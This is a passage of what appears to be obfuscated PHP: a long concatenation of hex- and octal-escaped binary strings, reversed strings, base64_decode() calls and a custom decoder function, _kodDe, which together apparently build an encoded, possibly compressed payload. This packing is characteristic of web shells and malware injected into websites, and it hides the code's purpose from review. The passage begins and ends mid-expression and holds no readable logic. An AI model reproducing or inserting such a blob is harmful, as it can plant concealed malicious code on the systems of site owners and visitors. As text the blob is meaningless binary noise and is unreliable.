x53\x30\x2b\x59\x57\xad\xd9\xb4\xab\x4e\xe\x65\xb2\x1\x6f\xca\xf0\x14\x70\x54\x8f"."\x4b\xd7\x96\xc1\x5c\x3\x94\x26\x33\xa6\xca\x91\x0\x1b\xe2\xb4\x34\x9b\x54\x6\xee\x68\xf6\x48\x40\x6\xfb\xe5\x54\x3\x61\x1a\xad\x50\x8\xb8\xed\x5\x55\xf2\xf\xc6\x80\xda\xa4\xd9\xfa\x68".strrev('^w{–Öóİvè3Ê8Ò'."\r".'D·RÕjHKcD6¶’¥ÉB¦§ß×èlxD{h[‰/E')."\x70\xf1\xae\x1f\xfc\x7c\xd7\x79\x9b\x77\xde\x73\xe1\x5b\x9b\x7f\xbe\x73\xeb\xf\x50\x74\xc7\xdd\xe7\xef\xdc\x7c\xe5\xdb\x97\x9d\xb9\xe3\xee\xf3\x76\xdc\x7d\xca\x5b\xdf\xbe\xfd\xaf\xf7\x9d\xbb"._kodDe('L3HiXhytjNZkJgSr3crl3SrpzOzFbc614ip8zd3ao6J5jWbWaGp9zR6M6NuO5euq9A==')."\x2e\x3c\x6f\xc7\xd6\x2b\x50\xfe\x5d\xdf\x11\x35\xa3\x6c\x3b\x37\x5d\x8a\xcb\xde\x77\xda\xce\xbb\xef\x7e\xeb\xaa\x1b\x79\xea\x5f\xef\x3b\x95\x36\x66\x2d\xd0\xb\xdd\xba\x83\xed\xf7\x98\xa\x16"."\31\35\145\261\2\13\122\267\3\112\137\101\107\43\254\144\362\172\146\4\353\153\71\171\335\122\34\242\267\245\241\377\113\146\311\117\27\34\265\215\264\25\243\204\223\25\66\67"."\1\276\50\123\172\261\214\227\26\214\122\220\332\117\271\24\270\245\365\127\153\230\151\102\215\145\205\307\132\314\125\3\16\302\25\32\26\325\51\303\32\2\144\133\224\141\124\114".strrev('¹\'"dnoÚà”nUÙ–ªFoO˜¤˜hZÂ.9µ6ŞVœÔgºO’qp²cŠfa')."\x47\x2\xa4\xa9\x44\x5\xc0\xa7\xd0\xa6\xf8\x14\x72\xf1\xab\xb8\x8d\x5\xf1\x95\x3e\xbb\x26\x97\xf7\x98\xdc\x7c\x4b\x2f\x17\xa4\x4b\x9d\xf2\x64\xcd\x41\x94\x5b\x23\xdf\x3a\x7b\xba\x96\xac\x31"."\214\274\163\256\104\264\257\53\116\215\214\362\150\273\156\141\315\216\2\102\164\342\46\222\134\312\213\156\320\250\220\32\243\17\161\74\151\351\131\203\351\31\353\105\222\223\351\356".base64_decode('E1k1V3DOoC1gua6cFrWV82Vsau0sbAOTTrjCU6XvQljYkcjQgvcai2+YznbJ4Bln')."\153\361\373\375\222\250\126\150\226\341\20\124\47\356\172\21\54\214\167\363\124\360\116\256\42\201\266\171\56\247\333\116\13\61\304\122\146\50\250\241\363\3\315\50\100\66\304\234"."\xc0\x3c\x14\x24\xa3\x4\x9b\x78\xb0\x24\x35\x8a\x6\x17\x56\x6c\x66\x29\x51\x29\x15\x18\x14\x5\x51\x96\x44\xa5\x84\xe7\xad\xc5\xdd\x13\xbd\x94\x95\xa\x2d\xd4\x32\x4e\xab\xd4\x9b\x61\x18\xaa"."\200\350\245\66\103\244\353\331\243\141\270\245\276\217\103\6\126\266\327\75\233\250\127\176\76\301\150\322\320\301\237\265\211\266\51\234\43\120\245\55\131\236\46\304\332\300\305\311".base64_decode('IHxGUUeeyDIiLkpczdQuaIyJsxHFYZR0vqoqNr+XaA8lIx1qX4gZUGjlctDOjthB')."\254\336\150\214\351\121\43\35\304\46\251\170\221\4\270\321\46\336\32\142\153\253\332\60\230\353\105\40\35\53\172\253\350\334\267\245\315\257\346\164\107\5\362\207\321\43\30\267"."\xab\x5a\xda\xb4\x1c\x69\x7\xa8\x59\x3\x1a\x17\x8d\xb4\xab\x9d\x91\x84\x54\x47\xb9\x52\x55\x87\xe4\x6a\x20\xd4\x17\x51\x93\xc9\xb8\xd4\x1d\x62\x68\xb7\x42\x5d\x1a\xef\x54\x3b\xe2\xf1\xa5\x11"."\x58\xdc\x30\xf1\x2d\x12\xfe\xc5\x26\x5a\xe2\xba\x19\xc7\x84\xa9\x16\xbe\xa1\x91\x55\xd3\x64\x2\x7\xdb\x82\xe3\x43\x3c\xa9\x80\x82\x27\xda\x45\x1d\x3d\xa1\x4\x57\xab\x9f\x13\x68\xa\x34\x8b"."\xbc\xe8\x83\x2a\xb6\x2e\x68\x65\x76\xa7\xc9\x54\x28\x51\xc3\x23\x0\xf5\x14\x0\x8b\x2\xbc\x3\x40\x81\x9e\xf8\x72\xa5\x23\x1e\xed\xef\x8d\x25\xa9\x21\x3c\x85\xc7\xe2\x52\x3a\x51\x9e\x86\x64".base64_decode('5i+gOhmqD/dFQx1hJRJLxZl1BNdfJXYxSR5nQ2DZOvcHAOVpRLbdkWvkNcE2GvDV')."\17\326\15\116\37\154\30\154\134\35\30\264\207\30\32\323\304\71\125\301\126\262\214\253\303\63\145\310\323\6\221\276\116\350\166\13\17\41\106\1\366\143\62\171\2\30\201\305"."\23\241\216\50\153\42\132\364\20\214\167\104\150\340\315\213\156\331\161\317\371\157\136\276\171\347\331\347\241\212\166\375\360\264\135\227\334\211\10\43\114\14\155\76\367\315\137\236"."\277\353\242\55\273\316\75\25\372\365\326\226\273\166\154\275\377\315\213\156\334\271\371\322\135\27\377\342\315\37\236\101\23\336\376\351\55\73\317\271\221\67\114\171\373\302\137\356".strrev('ï:Ï;éõyÙoç›ãv^v«œó·œW]ÆÇuÙNk£ÉŒİnoyæ}¿J‡ÈºQ N:ÿ:')."\xad\x2d\x3f\x38\xda\xbb\xc0\x68\x7c\x80\x4d\x11\xd8\x51\x6\x4f\x1c\xb4\xa7\x37\xd0\x61\x1f\xb4\x67\xe0\x21\x6f\x44\xbf\xd\xd8\x8\x3\xfd\x32\x5d\x72\xa2\x5f\x7c\x42\x7f\x38\xd6\x11\xf6\x1a"."\x35\xc9\x51\x70\xb2\x30\x9d\xae\x1c\xaa\x12\x3\xb4\xac\xd\x4e\x1a\x58\x9c\xd8\x6a\xb7\xd6\x4f\xd9\x8a\xf5\xb0\x2e\xa4\x46\x49\x8d\xe9\xc\x27\x3b\x12\x91\xf6\x30\xa8\xf9\xf3\x89\x9a\x46\xa8"."\x39\xd0\x87\x40\xd0\x64\x62\x19\xf\x73\x3b\xbe\x2a\xa7\x18\x4a\x3\x5b\xe4\x8d\x8a\xab\x23\x5a\x20\x63\x16\x2a\xc5\x12\x69\xac\x52\x87\x35\x40\xea\x7c\x18\x99\x11\xb\x2b\xa5\xe\x9f\xd8\x8"."\xa0\x67\xd0\x96\x6c\xc0\x96\xf4\x44\x31\xb8\x7e\x65\xbd\xaf\xc9\xd7\xdc\xa8\x80\xc7\xc\x5a\x2\xfc\x64\x28\x75\xa0\x6d\xce\xcb\xb9\x3e\xe2\x4b\xbb\x62\xcd\xbe\xa6\x46\xa5\xae\x3c\x52\x7\xed"."\x12\xe3\x8a\x5a\xaf\xd2\x9c\xb6\xa2\xf9\x1a\xa0\xc1\x72\x73\x45\x5e\x84\xe5\x6c\xc7\xd2\xc\x84\xf6\x94\x8c\x8f\x83\x78\x79\xf4\xeb\xf2\x7d\x91\x9\x88\x12\x74\x9e\x50\xe\x2f\x4c\x9\xc5\x3a".base64_decode('3Tmpy4y+eqJ5mQk43CSfTXN9o5IG44kaiaSYazBaXYPRMAPwR183n29qGaFQwzna').base64_decode('LM1mEwVQMlUYSmeL5TVRN9Dk0PwowFOwDQGvCaEpnsBmEMP5JNZII75M6ijFSftZ')."\264\163\14\5\202\17\215\336\225\274\17\154\55\53\214\364\341\236\120\260\11\140\70\325\321\103\127\171\122\132\346\331\364\64\327\102\25\303\251\270\226\10\147\133\40\37\335\56".base64_decode('GCHsQ/JFYl3xRC81fUt29IR7QwFA7nQl0PyYrlNalXqM+Sio3jX85ENsyFLkq2hf')."\251\16\42\322\350\50\224\163\320\30\230\175\205\230\67\153\244\110\153\75\365\76\0\125\162\227\75\361\104\112\105\3\0\350\131\302\272\365\322\51\42\51\215\143\13\256\61\306".base64_decode('bwwj+sxkTheyaebZB1WO6+yIx7oizMqvE7j5ctZ0ZepMRLB5O3xfYVVJtpUoIrQv').base64_decode('UKQ8nuVhYbONEzgtgCKCFEARftjgXJILIvz9ZIyHBWGNIlgDUWDf5Z083MNNdHFC')."\74\41\105\102\211\120\157\222\107\23\313\271\265\10\207\121\253\21\65\326\337\53\60\176\64\264\14\55\226\270\40\134\30\266\156\10\114\157\153\34\244\206\170\64\110\177\226\260"."\x18\x36\x4e\x1a\x5a\xd7\xec\x53\xe6\x6e\x68\x84\x3c\xcc\x74\x4d\x75\xf2\xe8\x5c\x56\xc5\x57\x4e\x88\xaa\xd1\x78\x37\x8d\x13\xd7\x48\xe1\x52\x56\xf0\x3e\xca\x80\x82\x8\xf2\x94\x20\xc8\x6d\x76"."\x74\xf1\xdd\xa0\xa0\x35\xac\x50\xeb\x5e\x25\x16\x5f\x1e\x12\xde\x76\xa4\x4\x80\x8\xe7\x3b\xc1\x13\x7\x6\xc7\x7\x3\x88\x88\xb0\x57\xb\xc3\xba\xce\x76\x85\x91\x27\x1d\x44\x76\x40\x45\xc"."\120\72\304\216\321\325\76\70\61\324\202\231\143\142\132\204\20\31\271\100\177\127\260\0\301\225\120\0\61\324\345\2\263\260\243\246\175\352\340\372\301\343\6\375\1\152\315\210"."\211\232\101\237\150\222\32\136\201\316\330\144\322\145\212\251\22\207\62\120\73\352\45\204\350\256\245\221\105\360\3\234\336\42\40\133\41\272\270\225\117\146\370\204\365\61\364\177"."\x77\x6a\x7d\x18\xfd\x1f\x45\x3f\xd1\x14\x9a\x2e\x83\x67\x40\x5b\x32\x1a\x59\x1a\x5e\x8f\xff\x88\x84\x46\x3e\x90\xd4\x68\xc9\x5d\x20\x12\x5b\x8f\xfe\x22\x4\xb3\x3e\x12\xf3\x56\xd6\x1e\x4e\x2d"."\17\207\151\6\26\206\137\221\25\41\34\350\252\344\72\13\133\5\100\262\260\22\200\252\125\265\201\14\246\177\150\106\243\252\6\355\176\130\57\334\231\101\103\375\261\315\365\160"."\x86\x84\x92\x1d\x2\xfb\xba\x16\x44\xf5\x5a\x20\x3a\xfc\xee\x85\xc0\x1d\x42\x41\xbc\x3b\x11\xef\xef\x93\xe2\x3d\xa1\x65\x91\x58\x37\x8b\x5\xa7\xb3\xd0\x74\xa8\x5a\xe9\x8c\x24\xd1\x10\x75\xb0"."\xc5\x28\xfc\x54\xc9\x71\x20\x38\x9\x59\x24\x53\xc3\xae\x25\xdd\x89\x30\x3b\x8a\x48\xa4\x3c\x66\x12\x28\x66\x76\xef\xb2\xf6\xfe\x48\xb4\x53\xb6\x3e\xc7\x19\xe1\x40\x21\x58\x1d\xce\x94\x69\xac".strrev('Æ×šC;â+¼CKá-sYGHE‹âbá‘‹'."\0".'„Xd"Æå“9YĞìN,q')."\xb8\xf9\xe4\xc2\x6c\x5a\x72\x75\x80\x71\x70\x80\x4a\xe5\xb0\xbf\xb\xc4\xdd\x69\x5c\x76\xea\x11\xbc\x12\x19\x98\x24\x66\xa0\x9a\x7a\x8a\x64\xc5\x1d\xa4\x20\x44\x6d\x12\x20\xfa\x1d\x5c\xdd\x46"."\250\341\325\154\141\122\123\141\47\145\70\5\327\127\300\244\20\175\45\102\354\70\245\357\300\171\116\45\216\252\51\111\275\311\101\55\3\204\214\213\212\310\101\234\54\104\105\130"."\x43\x91\x8\x9a\x69\xd4\xcd\x5a\x71\xbc\xb4\x9a\x73\x4c\xe0\x7e\xc1\x7\xbf\xd0\xa2\x2f\xd3\x9f\x41\x88\x32\x11\x9\xd8\xc6\xd4\xfb\xe0\x90\x65\xf6\x14\x6e\xae\x79\x70\xb0\x6e\xaa\xd1\x82\xc".strrev('H½©êPd:….‘(J>ñ;Ä\\@©³Læ±"PÌ»L¼ÏÁ”¬£GZ Ìl').base64_decode('q45EGO8OmoulNdS7hF+L6xWwzm50l4rEOsMrlHojO6FqmgqFFbQXWUVKVU2sBtpW').base64_decode('uAey8+a4Ii8vxkd3UFhKLLkq0oy4VmCWsD5g1nkKpYhpUiSJDuxolPQUJRk2JmR9')."\12\367\200\200\201\230\371\240\102\125\250\210\45\320\212\150\122\170\105\52\21\302\100\102\175\356\273\17\372\107\20\12\346\216\254\242\106\315\103\11\315\26\130\15\302\203\325\56"."\x12\x91\x12\x8f\x98\x48\x84\x15\x44\x8e\x3c\xa9\x4f\x3c\x85\x48\x10\xe8\x30\xcb\xf2\x85\xa5\x40\x75\xd3\x58\x5f\x22\xd2\x1b\x4a\xac\x84\x21\x13\x3c\x0\xec\x40\xb3\xe0\x32\x12\x16\x11\xc3\xee"."\x97\xcc\xd4\x63\xa8\xd5\xb2\xd9\x3a\x9d\x63\x8e\x61\x11\x3f\xcb\x30\x2c\x6a\xd\x6c\x0\x3c\xf3\x40\xf0\x50\xf7\x85\x2a\xb7\x42\x66\xc2\x95\x6\x66\xcd\xeb\x63\x1\xe6\xd\x82\x58\x3d\x31\x9".base64_decode('WhGhHB4TswZrH2ZFTpXttoR/RXxI4klm2L4r1B+VITBUytLwys/YI6yltfYIS2Ni').base64_decode('Gr7boD8Nc6B/1EFFw0zEk1ZKtpErce9u0Co4W/tTcRWdH4kwxubQIz6sUnslvlue').base64_decode('FKgGZ+DOKj+jayxPra7x8lwiFY51R2Lh1t7JSDLUq7CGg8wN+3SbD/VE4moU0cSq')."\54\126\213\304\101\244\34\110\313\336\111\124\341\344\44\240\11\255\155\307\252\110\76\5\15\223\150\117\367\162\345\30\242\322\215\26\104\110\70\67\340\142\157\222\126\111\343\322"."\xf2\x71\x5\xe5\x3d\x7e\xf9\xc\xb3\x5\xa7\xe0\xcc\x94\x4a\x59\x28\xb2\xab\xae\x8f\x7b\xd5\xa7\x65\xb0\xd0\xe4\xe6\x77\x33\x4c\x81\x1c\xa1\xb5\xa2\xab\x40\xbf\xe4\x9c\x40\xcb\x4a\x4a\xdb\xa".base64_decode('+zK5NCq524kOzoKK/YQgvlDVRbeKum3zq2PCBbGgkxdOGmT/iJ3tbAgrJSepF8DR').base64_decode('Vmea6MALqzZhDyTpxpN7GDEv1FOlpyDUFOEdl3IJYFQ4RMRXIKLOIcbLi06uNdgR').strrev(' [eùv¡)QÃd¦eñFaG"Éô³`Ô%yuÓÃˆarÏ]È4Uº}™,ä@½ç')."\x34\xc3\x4\x28\x59\x1f\x30\x77\x8e\x34\x36\x6f\x2d\x54\xc5\x2c\xa0\x9c\x1c\x40\xd8\xaf\xc5\x52\x2\xc2\x9\xd\xa9\x13\x13\x31\x7e\xe1\x14\x22\xab\xc9\x46\x9a\x92\x1b\xe0\xa3\xe5\x19\x27\x53"."\47\126\340\260\41\173\210\10\10\337\220\174\121\57\341\3\216\215\227\341\6\36\23\304\303\252\324\226\76\236\77\303\235\0\323\321\220\206\231\0\150\220\154\103\245\105\64\242"."\x7\xb5\xd4\xb4\x26\xa5\x35\x20\x41\x7b\x99\xdf\x24\xf0\x4c\x19\x65\x1a\x75\xd8\xb4\x42\x77\xc0\x3b\x98\xb\x8b\x44\xe2\x50\x36\xa0\x63\xab\x24\x6a\x19\x82\x2d\xc7\x78\x41\xea\x19\xeb\xf3\xb".base64_decode('9UvOOafY+DXLdUBG/kGLCHU+/4MJXZzNqBgxAvvcQgIRki+RQhLy9JQhy5GasMDM')."\347\41\131\254\61\204\261\143\161\265\7\35\12\161\106\72\30\166\312\205\204\131\51\100\5\16\242\154\62\101\142\166\13\214\331\102\162\253\104\357\55\141\262\327\41\374\312\103"."\x4c\x53\x3\xdc\x70\x89\x23\x3b\x44\x7f\x56\x16\xb3\x7e\xd4\x70\x58\x75\x59\xdd\xe1\xee\x8f\x30\x36\x63\x16\x88\xb8\xcd\x92\xd1\x72\x91\x63\xbf\x71\xc9\xdf\xa0\x36\xa6\x63\x9b\x2f\x26\xf6\xa8"."\x52\x98\x81\xae\x54\x77\xe\x9a\x88\xaf\xad\x92\xf1\xfe\x4\xbb\x5b\xc1\x71\x62\xbd\x9a\x8\x77\xac\xe4\xd7\x19\x1c\xda\x15\x5a\xe6\x85\x44\xb0\xec\x2f\xd4\x5d\x13\xcc\x25\x52\x18\x4e\x58\x3f"."\x35\x11\xc7\xa2\xbb\x70\xb4\xcb\x53\x20\xd9\xc3\xdd\x43\xba\x61\x6a\x34\x12\x5b\x5a\x33\x1\x11\x10\xbd\x52\x11\xa\x8c\xa4\xc2\xbd\x5e\x98\xbb\x86\x64\x38\x94\x60\x7e\x45\x71\xbc\x3d\x1a\xef"."\x90\x92\x23\xf1\xea\x91\xe0\x14\xa\x7\x52\xc1\x1f\x5\x6\x4f\x6c\x18\x5c\x47\x78\x97\x16\xc4\xc2\x64\xd7\x63\x9\x81\x5f\x1d\x9a\xd1\xd8\x36\xb8\xa1\xb1\x61\x30\xd8\x16\x98\xce\x5\x5b\x14".strrev('ïö`é¸ğ­\\ˆŞ¤›ÙğÅ±÷ ÁÁÂ>'."\0".'@ÁbZ@aüøx´ˆvm€S®vI]')."\xaf\x3b\x4a\x15\x5b\xce\xaa\x7c\x3f\xe1\xbb\x50\x35\xb9\x32\xc9\x47\x9e\x2e\xc3\x5a\xe9\xae\xb5\x46\xb3\xc9\x2a\xf\x9e\xcc\xe8\xff\x3e\x39\x2b\xd6\xb2\xa9\x99\xd1\xb5\x58\x5d\x96\xc3\x32\x28"."\140\230\142\37\210\15\233\65\63\25\354\374\110\214\276\260\63\106\240\200\253\12\204\252\107\4\233\15\373\55\311\366\145\11\235\202\160\314\166\40\252\261\273\47\162\374\322\150"."\157\54\336\167\102\42\231\352\137\266\174\305\312\125\60\322\154\71\14\53\176\346\273\14\234\136\6\307\64\53\70\306\234\65\57\303\104\277\156\7\145\142\212\3\121\37\21\252".base64_decode('Y4gqSGUBPBXjhWDtJFpbsFhymqfI0WfpadN0pkhd1vvZFUPiwKA9xNZfMKuPQVCo')."\xb5\xd9\x82\xd5\x1\xf2\xc1\x2f\x3b\x8d\xc6\x4b\x55\xa6\xe8\xb2\x69\xcf\x39\xf\x0\x71\x87\x2b\x51\x3\x2\x38\x93\xe9\x13\xae\xf4\x17\xfd\xd9\xc1\x54\x37\xf6\x6c\x39\xb8\x8a\xcf\xb5\x61\x49".strrev('œ…kò˜ıG'."\n".'T–”2ÕJ­@ÿç,tÕ°n?Û~c'."\0".')î™*Ş#´ÎHk)f3%®')."\211\10\267\174\221\101\265\21\127\272\160\132\132\66\13\6\363\66\67\352\107\237\220\322\150\146\124\71\73\77\261\102\4\167\370\212\43\66\217\311\133\214\234\60\134\373\7\237"."\x63\x3d\x9e\xdd\xcd\x81\xdc\x1d\x6d\x92\x74\xa2\x45\x99\xd\x3e\x9b\xbb\x10\x45\x2d\x59\x74\x32\xaf\xb9\x82\xe2\xc2\x54\x1a\x71\x53\x4c\xa3\x3e\x45\x78\x7b\x67\xf2\x52\xca\x84\x1c\xed\xd9\x70".strrev('»Ò\'ÛB¬§L“íiG^8´If"'."\0".'ÓÂ.295Â8¾şâ#‹˜†g²3Ã ÉÄ')."\56\27\23\262\253\372\320\362\344\154\177\117\157\250\303\217\216\27\256\160\217\16\365\301\24\72\325\331\302\322\306\355\331\214\221\241\220\31\163\225\74\232\11\130\61\325\316\137"."\x8f\x75\x3b\x42\xa6\x40\xea\xcd\x34\x63\xe9\x59\xac\x61\xc3\xa8\x48\xa\xf5\xac\x24\xa\x14\x78\x82\xc6\xa9\x97\x3c\xa6\x83\x96\xd7\x78\x83\x71\x37\x0\x57\xd5\xf8\xee\x8a\x9a\xdf\x5d\x51\xeb"."\xbb\x2b\x3c\xdf\x5d\x51\xfd\x5d\xa\xf2\xac\x58\xad\x5c\xee\xc8\xe3\xb5\xe0\xc2\xa6\x2e\x50\x46\x8e\xb0\x53\x6d\x18\x6b\xfe\xc8\x7a\x48\x20\x5a\xa5\xca\xc5\x1\x94\xdc\x49\x9\xea\x2c\xcf\x6f".strrev('s­BFƒ±m¦ƒ[§Ìåèé»‚ëŸGg.e³AXÍ¨‡eŸ”'."\0".'Uq~ÒÃß‹')."\x2d\xba\x78\x92\x5d\x1e\xb9\xfb\x44\x55\x90\x24\x2e\x1f\x7c\xc4\x71\xff\xb9\xdc\xbb\xae\x70\xc1\x4b\x65\xfe\x34\x1c\xe6\xbe\x6a\x10\xd3\x11\xca\x61\xef\x23\x8\xcf\xc1\xa8\x84\x27\xca\xa6\xad"."\313\276\235\263\72\161\30\312\315\355\45\107\311\105\155\2\143\42\246\134\50\271\114\146\16\210\145\157\215\170\300\374\105\227\213\367\11\77\352\272\307\351\260\255\353\43\114\5"."\x52\x62\x40\xb8\xb4\xa1\x8f\x3b\x13\xf6\x76\x7\xa3\x2\x81\x14\x2d\xee\x48\x9a\x5e\x17\xfb\x6b\x2\xfc\x92\x3\xb\x8a\xd\x24\x67\xe4\xa8\x5d\x50\x35\x6e\x26\xec\xdf\x3c\x19\x1b\x26\xa1\xa0"."\77\253\152\365\332\157\11\357\316\150\56\351\23\2\113\365\111\346\71\331\263\3\74\316\226\7\273\7\173\7\123\362\60\71\226\66\74\214\232\55\371\157\165\265\105\370\166\206"."\345\107\274\376\263\301\230\332\63\64\334\212\34\127\323\261\64\44\22\216\43\150\21\55\74\337\70\47\367\202\344\371\220\32\153\367\4\14\207\325\73\54\124\367\312\25\351\5"."\33\171\275\340\143\234\153\330\141\111\5\365\307\315\120\6\361\223\15\176\370\133\131\217\320\320\225\332\315\54\234\211\353\352\320\112\254\153\251\73\266\1\375\66\326\371\352\60"."\241\112\342\170\26\61\200\264\243\256\345\330\6\22\150\4\77\62\153\301\212\104\162\125\53\256\342\101\312\326\206\206\126\272\77\152\43\243\201\367\376\314\340\314\340\70\340\203".base64_decode('tlH8RfGYhvcMmFAR2mP3IqqMfAGtw6jLKT28JQwt93bOYVg01LvKL5xHL2qbKBYU').strrev('î‚G‹ÛÂ,öÜ1æP–0uñ{ÑÙ6äEßx¶ß_ŸåÕ?¾µ¥l{'."\n".'õM›ë[2à').base64_decode('2FRlYf0VtbVmCR11CEMVAxkYzH6OxYQ/75LujJsWXJUDgp3ZNFte07BEbLa1icCp').base64_decode('BQtIWff7y5OVkh+LIPxJ2bGg5wWBJnd+LERw55dRY0agj6II0tcgWhT5iRDJWzIR')."\120\321\135\311\264\76\0\206\261\46\3\11\14\72\54\154\3\60\112\124\335\50\161\211\247\275\170\250\375\210\350\302\353\37\155\52\164\374\72\172\255\54\356\167\50\274\257\123".strrev('ö+ø\'h’~õ‘Šş–V¥K56k©±ªvFı~xığÆN7@˜½Ÿ—ë“ÁGx').base64_decode('wZqVyvwAy0A6EeH1uShzDc01J8a9xL0kkK52Ko82rzJzVsucBS3MhOs4plxRKTNF')."\156\24\144\116\347\217\16\16\63\74\40\36\246\140\175\303\23\56\171\351\167\201\305\60\362\35\316\20\210\53\237\150\255\353\311\23\350\50\345\337\245\327\4\210\344\234\356\44"."\xac\x72\xa4\xf2\xd7\x17\x6a\x60\x52\xc4\x8c\xb1\x3\x3\x8e\x5d\x49\x11\x96\x4f\x48\x8e\x5\x2c\x9e\x5f\x13\x5b\x24\x5d\x18\x11\x3d\x49\x63\x9d\x75\x58\xe1\x23\xa8\xa1\xa6\x20\xb3\xc8\x91\x2b"."\213\245\363\225\322\110\253\224\250\70\246\251\24\265\322\344\321\24\70\315\156\231\146\57\304\37\152\235\26\230\75\154\243\10\340\153\356\153\27\237\43\302\63\42\365\324\3\51"."\364\236\40\200\237\112\11\340\103\52\121\201\134\175\205\12\177\326\242\114\302\320\302\276\150\177\167\44\46\151\106\111\0\265\243\63\246\206\372\372\152\46\160\202\5\13\10\261"."\132\101\140\15\273\155\311\260\125\265\310\50\346\224\14\66\344\150\255\303\320\72\305\266\62\314\343\160\135\20\360\50\311\40\370\247\105\6\24\251\307\105\224\141\264\114\374\44"."\x44\x93\xeb\x17\x2f\xa\x1a\x8b\xf9\x60\xb\xbf\x48\x96\x29\xec\x54\x2\xc1\x63\x30\x37\x15\xc4\xba\x47\xa5\xe3\xf0\xec\xca\xaa\x10\x4\xda\x25\xbc\x20\x29\xca\x22\x4d\xa1\xe3\xd8\x5a\x4f\xe4"."\340\365\112\36\235\307\134\361\162\261\267\160\214\335\107\55\12\152\162\42\336\131\11\223\221\277\234\211\302\142\166\17\110\276\312\10\111\376\311\311\63\25\35\132\151\131\165\21"."\x5c\x79\x20\x23\x27\xd1\x99\x24\x96\x34\xd5\xf9\x83\x44\x12\x10\x14\xfc\xa2\xfb\xae\x87\x5f\x8d\xd4\x58\x14\x65\x2d\x33\x82\xd7\x91\x40\xfa\xf0\x25\x48\xe8\xc3\x8c\x9\x4d\x70\xbd\xb6\xe0\x48".base64_decode('Gh8VbEtGROuWeBJm3TpaET7nN2yohoHSqDcpVDa8ILxevDDMaAsYOr3cn6FrVc4k')."\40\54\17\375\25\145\242\261\156\21\241\214\210\53\161\200\351\147\223\330\340\100\175\140\372\206\15\101\203\251\126\61\65\20\126\66\300\163\323\370\140\300\235\37\365\4\206\236".base64_decode('ZwSANyelGo+HLbdvcLqwf+MqVArWq2ptXTzAL46GWBoj/Yzm+WzS1+b9qeU82BET')."\304\55\137\332\24\213\4\210\220\44\344\366\110\334\66\306\37\73\241\243\52\207\103\345\262\34\145\57\370\220\133\205\202\221\16\362\75\116\157\32\2\31\141\66\306\262\20\14"."\xe3\x81\x63\xfd\x27\x4f\x2\xb6\xaf\x21\xe0\x31\x84\x2\x11\xad\xb5\xc6\xb\x47\x75\x71\x20\xf\x2c\xb2\x33\x96\x51\x76\x5c\xd8\x89\xbe\x6f\x58\x47\x1e\xa3\x59\xa3\x8d\x69\x34\x4b\x9d\x2\x5c"."\x79\x6b\x1d\x71\xc6\x5f\x87\xb0\x11\x4d\x1\x34\x20\x9a\xb2\x8\xa3\x1d\xc5\xd2\xb\xad\x75\xa4\xb9\x76\x5e\xd7\x51\x79\x82\x58\x6a\x7d\x4\x15\xac\x53\x18\x4e\x2c\x6a\x7c\xc4\x2c\xc7\x44\xc7".base64_decode('HTdggqeh+hNgWRGKwU3OMSfS32OPYSuEPFBW0C2qN06QDLlDHBYiLHiiqi8RT8U7')."\330\213\76\265\144\135\263\31\271\152\123\123\73\301\326\60\253\40\256\136\301\162\160\2\40\10\20\230\167\253\122\52\161\115\65\114\21\362\123\12\153\276\250\307\47\343\61\366"."\2\112\212\57\33\154\302\24\120\6\64\166\347\4\52\256\364\22\55\231\257\70\342\104\304\156\375\123\330\316\330\6\260\344\304\20\273\120\104\25\15\120\321\144\153\23\63\362"."\x60\xa\x70\xc2\x3a\xd\x72\xd6\xa8\x83\x8a\x7d\x53\x5c\xc1\x4c\x2f\xb9\x24\x1e\xf4\xdb\x5\x93\xf9\x75\x9c\xd9\xd4\xd4\xe4\x6f\x6a\x46\xff\x31\x15\x69\xe6\x5f\xae\x45\x78\x5a\xe0\x59\x9a\x9a"."\x5a\xc8\x7f\x34\x81\x8\x6d\x61\x52\xdc\x29\x68\xf3\x33\xac\x5\x19\xc6\x75\x9d\xf9\xd7\x80\x2c\x46\xa9\xc2\x88\xa8\x81\xe\x6c\x2d\xa6\xe0\xa6\xd\x31\xba\x81\xb5\x1f\xcd\x7\x71\xb7\xc8\x10"."\xc8\x42\x89\xf5\x5b\xa8\x90\xcb\x45\x88\xe9\xde\x41\xe0\xb7\xb6\x30\xc3\xb2\xbf\x6e\x16\x46\xb4\xc\x9a\x6d\x32\x28\xd0\x5e\x6e\xa8\x88\xb2\x89\x75\xb4\x90\xda\x85\xb6\xf2\x46\x85\x4b\xd9\x1"."\xf9\x63\x1\x36\xb8\x14\x28\x7c\x4c\xfb\x59\x82\x5f\x7e\x13\x2\xa\xd1\xa3\x41\x5c\x5b\xb8\x9a\x86\xca\xb8\xfd\x38\x62\x8\x3a\x98\x33\xbc\x9f\x18\x20\x49\x48\x30\x61\x26\xf9\xa6\xc4\x51\xf9"."\166\202\44\163\273\100\22\53\160\307\3\70\32\343\65\321\247\107\250\165\36\214\141\215\345\232\67\307\125\161\12\343\350\361\74\106\206\24\263\110\154\31\146\45\333\115\74\256".base64_decode('MJSYjoTyUkEuXxJKBqAzQWz0R4yCyzJZlYrKo7wQZ2R9SrlL4orQ3g7xp1ioMiNr')."\xa5\x2\x9b\x90\x46\x89\xef\x69\xf2\x8a\x1e\xd5\x3f\x6d\xd9\xb7\x6a\x9a\x1d\xef\x14\x93\xd9\xb2\x4c\x61\x66\x5c\xa5\x42\xc4\x62\xd2\x9c\x31\x59\x79\xf2\x73\xb4\x7c\x18\x24\xcc\x0\x54\x2f\xa6"."\203\73\170\224\52\360\46\171\312\204\250\210\275\252\0\300\253\163\223\153\211\32\271\61\334\223\233\270\166\354\340\376\151\145\177\217\124\147\100\322\123\261\301\7\277\120\22\140"."\165\214\111\174\124\240\154\231\71\64\353\266\74\150\10\336\127\33\314\263\127\347\254\221\211\267\136\316\47\3\361\235\7\173\313\22\26\266\60\165\326\304\123\272\122\326\44\347"."\xc4\x24\xa0\x7b\x5f\x4b\x9\x1d\xfc\xc5\x24\x19\x88\xf9\x32\x59\x2d\x84\x68\xf5\xba\xeb\xc0\xc\x9f\x1b\xc2\x5b\xf6\x19\x8b\x8e\x31\xea\xe\xbc\x7b\x2a\xeb\x34\xd2\x6c\x2\x37\x61\x21\x8a\x2c".strrev('­­ºØlUxëh€®6H¤aÎ‚¼ ŠRE×iYFá»'."\n".'ÜHG‚…¦U­„Ë]Uê').strrev('b”R8Z'."\n".'à)B*­U±{¢5Ÿëø{£¼RÊªCÇ", Ir°ğ¹d.}gÚw1r').strrev('¶ò#©j(=úºá•‹{'."\n".'Ê"d[¼'."\0".'¹TîŠnt”©‰>…`Ãç 